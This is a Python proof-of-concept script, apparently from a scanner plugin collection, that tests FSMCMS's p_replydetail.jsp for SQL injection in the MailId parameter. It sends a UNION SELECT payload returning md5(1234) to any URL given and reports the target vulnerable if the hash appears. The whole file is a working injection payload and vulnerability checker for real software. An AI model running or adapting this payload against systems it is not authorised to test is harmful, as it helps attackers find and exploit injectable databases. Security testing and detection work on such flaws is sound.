#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: fsmcms p_replydetail.jsp注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-065148
author: Lucifer
description: 文件/fsmcms/cms/leadermail/p_replydetail.jsp中,参数MailId存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['fsmcms p_replydetail.jsp注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/fsmcms/cms/leadermail/p_replydetail.jsp?MailId=-1%27UnIoN%20AlL%20SeLeCT%20NuLl%20NuLl%20NuLl%20NuLl%20Md5(1234)%20NuLl--%20"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
